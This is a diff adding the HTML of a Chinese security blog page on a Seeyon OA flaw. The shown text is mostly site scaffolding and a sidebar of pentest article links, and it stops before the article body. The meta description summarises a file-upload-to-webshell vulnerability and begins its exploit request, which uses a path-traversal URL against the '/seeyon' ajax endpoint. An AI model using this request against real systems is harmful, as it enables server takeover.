@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>Seeyon-OA(致远) | wintrysec</title>
+    
+    
+        <meta name="keywords" content="Seeyon-OA(致远)" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="应用简介用友 致远OA，协同办公平台 前台任意文件上传getshell漏洞概述 #影响版本致远OA &lt;A8+ 通杀  漏洞利用 POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1Host: 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Seeyon-OA(致远)">
+<meta property="og:url" content="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Seeyon-OA(%E8%87%B4%E8%BF%9C)/seeyon-oa/index.html">
+<meta property="og:site_name" content="wintrysec">
+<meta property="og:description" content="应用简介用友 致远OA，协同办公平台 前台任意文件上传getshell漏洞概述 #影响版本致远OA &lt;A8+ 通杀  漏洞利用 POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1Host: 1">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-12-14T01:55:31.846Z">
+<meta property="article:modified_time" content="2020-12-12T04:31:13.488Z">
+<meta property="article:author" content="wintrysec">
+<meta name="twitter:card" content="summary">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="wintrysec" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">wintrysec</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【0】基础知识
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%B8%B8%E8%AF%86/">【0】网络安全设备常识</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/">【1】现代密码学常识</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BWeb%E5%8A%9F%E8%83%BD/">【2 网络基础】Web应用常识</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BTCP&IP/">【3 网络基础】TCP/IP协议</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/4%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BHTTP/">【4 网络基础】HTTP协议</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/5%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BSSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/">【5 网络基础】SSL双向认证</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/">【6 网络基础】路由协议</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">【7 操作系统】Linux基础命令</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E4%B8%89%E5%89%91%E5%AE%A2/">【8 操作系统】Linux三剑客</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/10Docker%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%84%E5%BB%BA%E6%8C%87%E5%8D%97/">Docker微服务构建指南</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/11Flask%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/">Flask开发快速入门笔记</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/9Git%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">Git基本用法</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【1】Web安全
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SQL注入漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">XSS跨站脚本攻击</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">XML实体注入漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">命令注入漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E6%BC%8F%E6%B4%9E/">文件处理漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/">请求伪造漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E5%9F%9F%E5%AE%89%E5%85%A8/">同源策略和域安全</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞挖掘</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/">源码泄露总结</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/">未授权访问总结</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E/">会话管理漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-CLRF+SSTI/">CLRF和SSTI模板注入</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-PHP%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7/">PHP安全特性</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%92%8CARP%E6%AC%BA%E9%AA%97/">中间人攻击和ARP欺骗</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8BMySQL%E5%86%99shell/">MySQL写shell</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8BRedis/">Redis未授权访问利用</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8A%A0%E5%9B%BA/">数据库安全加固</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【2】工具手册
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/Metasploit/">Metasploit漏洞利用框架</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BNmap/">nmap端口扫描</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BBurpSuite/">BurpSuite简要手册</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8Bsqlmap%E5%A4%87%E5%BF%98/">sqlmap简要手册</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【3】渗透测试
+                        </a>
+                         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【1】边界资产信息收集
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%901%E3%80%91%E8%BE%B9%E7%95%8C%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E8%BE%B9%E7%95%8C%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">边界资产信息收集</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【2】打点寻找内网入口
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%902%E3%80%91%E6%89%93%E7%82%B9%E5%AF%BB%E6%89%BE%E5%86%85%E7%BD%91%E5%85%A5%E5%8F%A3/%E5%B8%B8%E8%A7%84%E6%89%93%E7%82%B9/">边界打点寻找内网入口</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【3】构建通道
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%903%E3%80%91%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93/">构建通道漫游内网</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【4】权限维持
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/11/02/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/">【1】文件传输</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/DNS%E4%B8%8A%E7%BA%BFC2/">【6】DNS上线CS</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Webshell/">【3】WebShell</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E5%8F%8D%E5%BC%B9Shell/">【2】反弹shell</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">【4】权限提升</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8/">【5】系统后门</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【5】横向移动
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/Hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【3】Hash传递攻击</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【4】票据传递攻击</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">【1】内网信息收集</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">【5】黄金票据和白银票据</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/">【6】指定主机上线</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%9C%AC%E6%9C%BA%E5%AF%86%E7%A0%81%E5%92%8C%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/">【2】本机密码和散列值获取</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【6】日志处理
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%906%E3%80%91%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86/%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86/">日志处理</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【7 蓝队】防守策略
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%907%20%E8%93%9D%E9%98%9F%E3%80%91%E9%98%B2%E5%AE%88%E7%AD%96%E7%95%A5/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E9%98%B2%E5%AE%88%E7%AD%96%E7%95%A5/">【蓝队】2020攻防演练防守心得</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【8 蓝队】基线加固
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">Linux安全加固</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Windows%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">Windows安全加固</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【9 蓝队】应急响应
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">【概念】应急响应模型</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Linux入侵排查</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Windows入侵排查</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Webshell%E6%8E%92%E6%9F%A5/">Webshell排查</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            【4】漏洞研究
+                        </a>
+                         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-ActiveMQ
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-ActiveMQ/apache-activemq/">Apache-ActiveMQ</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-Kylin
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-Kylin/apache-kylin/">Apache-Kylin</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-Shiro
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-Shiro/apache-shiro/">Apache-Shiro</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-Solr
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-Solr/apache-solr/">Apache-Solr</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-Tomcat
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-Tomcat/apache-tomcat/">Apache-Tomcat</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-httpd
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-httpd/apache-httpd/">Apache-httpd</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apereo-CAS
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apereo-CAS/apereo-cas/">Apereo-CAS</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Drupal
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Drupal/drupal/">Drupal</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Exchange
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Exchange/exchange/">Exchange</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            F5-BIG-IP
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/F5-BIG-IP/big-ip/">F5-Big-IP</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Fastjson
+                        </a>
